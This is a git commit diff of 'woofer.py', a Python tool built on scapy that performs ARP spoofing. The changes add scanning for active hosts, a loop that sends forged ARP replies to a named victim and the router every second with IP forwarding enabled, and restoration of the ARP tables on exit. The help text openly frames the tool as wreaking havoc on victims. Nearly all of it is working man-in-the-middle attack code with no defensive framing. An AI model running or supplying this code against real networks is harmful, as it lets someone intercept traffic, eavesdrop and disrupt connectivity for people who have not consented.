c5189ae0dcf1cb5bd192c6903c6762e4b922befd
veilwr4ith <114529635+veilwr4ith@users.noreply.github.com>
2024-03-26 12:06:39 +0800

    Update woofer.py

--- woofer.py
+++ woofer.py
@@ -18,14 +18,29 @@ import socket
 import scapy.all as scapy
 def setup_logging(verbose=False):
     level = logging.DEBUG if verbose else logging.INFO
-    format_str = '%(asctime)s - %(levelname)s - %(message)s'
-    logging.basicConfig(level=level, format=format_str)
+    logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')
 def validate_ip(ip):
     try:
         socket.inet_aton(ip)
         return True
     except socket.error:
         return False
+def get_local_ip():
+    try:
+        return scapy.get_if_addr()
+    except OSError:
+        logging.error("Failed to snatch the local IP address")
+        sys.exit(1)
+def get_active_hosts(interface):
+    logging.info("Scanning the network for active targets...")
+    try:
+        ans, _ = scapy.arping(interface, timeout=1, verbose=False)
+        active_hosts = [response[1].psrc for response in ans]
+        logging.info("Snatched some active targets: %s", active_hosts)
+        return active_hosts
+    except Exception as e:
+        logging.error("Failed to locate active targets: %s", e)
+        return []
 def get_mac(ip):
     try:
         arp_request = scapy.ARP(pdst=ip)
@@ -36,30 +51,23 @@ def get_mac(ip):
             return answered_list[0][1].hwsrc
     except IndexError:
         pass
-def arp_spoof(target_ip, router_ip, interface):
+def arp_spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    router_mac = get_mac(router_ip)
-    if target_mac and router_mac:
-        packet_to_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
-        packet_to_router = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
-        while True:
-            scapy.send(packet_to_target, verbose=False, iface=interface)
-            scapy.send(packet_to_router, verbose=False, iface=interface)
-            logging.info("Sent ARP packets to %s and %s via interface %s", target_ip, router_ip, interface)
-            time.sleep(1)
+    if target_mac:
+        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        scapy.send(packet, verbose=False)
+        logging.info("Sent a devious ARP packet to %s", target_ip)
     else:
-        logging.error("Failed to get MAC addresses for %s and %s", target_ip, router_ip)
-def restore_arp_tables(target_ip, router_ip, interface):
-    target_mac = get_mac(target_ip)
-    router_mac = get_mac(router_ip)
-    if target_mac and router_mac:
-        packet_to_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
-        packet_to_router = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac)
-        scapy.send(packet_to_target, count=4, verbose=False, iface=interface)
-        scapy.send(packet_to_router, count=4, verbose=False, iface=interface)
-        logging.info("ARP tables reset for %s and %s via interface %s", target_ip, router_ip, interface)
+        logging.error("Failed to get the MAC address of the target %s", target_ip)
+def restore_arp_tables(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    if destination_mac and source_mac:
+        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+        scapy.send(packet, count=4, verbose=False)
+        logging.info("ARP tables reset for %s", destination_ip)
     else:
-        logging.error("Failed to reset ARP tables for %s and %s", target_ip, router_ip)
+        logging.error("Failed to reset ARP tables for %s", destination_ip)
 def enable_ip_forwarding():
     try:
         with open("/proc/sys/net/ipv4/ip_forward", "r") as file:
@@ -68,7 +76,7 @@ def enable_ip_forwarding():
                     file.write("1\n")
                     logging.info("IP forwarding is now on")
     except IOError:
-        logging.exception("Failed to enable IP forwarding")
+        logging.exception("Failed to flick the IP forwarding switch")
 def disable_ip_forwarding():
     try:
         with open("/proc/sys/net/ipv4/ip_forward", "r") as file:
@@ -77,31 +85,37 @@ def disable_ip_forwarding():
                     file.write("0\n")
                     logging.info("IP forwarding is now off")
     except IOError:
-        logging.exception("Failed to disable IP forwarding")
+        logging.exception("Failed to turn off IP forwarding")
 def main(args):
-    target_ip = args.target_ip
+    victim_ip = args.victim_ip
     router_ip = args.router_ip
     interface = args.interface
     verbose = args.verbose
     setup_logging(verbose)
-    if not validate_ip(target_ip) or not validate_ip(router_ip):
-        logging.error("The provided IP addresses are invalid")
+    if not validate_ip(victim_ip) or not validate_ip(router_ip):
+        logging.error("The provided IP addresses are gibberish")
         sys.exit(1)
+    if not interface:
+        interface = get_local_ip()
     try:
         enable_ip_forwarding()
-        logging.info("Preparing to launch ARP attacks...")
-        arp_spoof(target_ip, router_ip, interface)
+        logging.info("Preparing to rain ARP storms...")
+        while True:
+            arp_spoof(victim_ip, router_ip)
+            arp_spoof(router_ip, victim_ip)
+            time.sleep(1)
     except KeyboardInterrupt:
-        logging.info("Detected Ctrl+C, resetting the network...")
-        restore_arp_tables(target_ip, router_ip, interface)
+        logging.info("Detected Ctrl+C, resetting the battlefield...")
+        restore_arp_tables(victim_ip, router_ip)
+        restore_arp_tables(router_ip, victim_ip)
         disable_ip_forwarding()
         sys.exit(0)
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="WOOFER: ARP Spoofer")
-    parser.add_argument("target_ip", help="IP address of the target victim")
-    parser.add_argument("router_ip", help="IP address of the router")
-    parser.add_argument("-i", "--interface", required=True, help="Network interface to use for ARP spoofing")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode for detailed logging")
-    args = parser.parse_args()    
+    parser = argparse.ArgumentParser(description="Script for wreaking havoc with ARP spoofing")
+    parser.add_argument("victim_ip", help="IP address of the poor victim")
+    parser.add_argument("router_ip", help="IP address of the unfortunate router")
+    parser.add_argument("-i", "--interface", help="Interface for reconnaissance (default: system's local IP)")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode for more chaos")
+    args = parser.parse_args()
     print(doggy)
     main(args)
